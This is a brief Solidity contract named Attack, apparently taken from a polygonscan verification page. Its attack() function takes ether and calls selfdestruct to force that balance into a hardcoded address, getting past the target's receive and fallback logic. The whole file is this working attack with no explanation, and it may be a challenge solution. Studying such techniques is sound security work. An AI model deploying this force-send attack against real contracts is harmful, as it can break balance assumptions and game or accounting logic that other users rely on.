/**
 *Submitted for verification at polygonscan.com on 2022-07-30
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Attack {


    function attack() public payable {
        
        address payable addr = payable(0x5edaa7a1CFD6Ce4DCAd4eCdD45ea34746D084019);
        selfdestruct(addr);
    }
}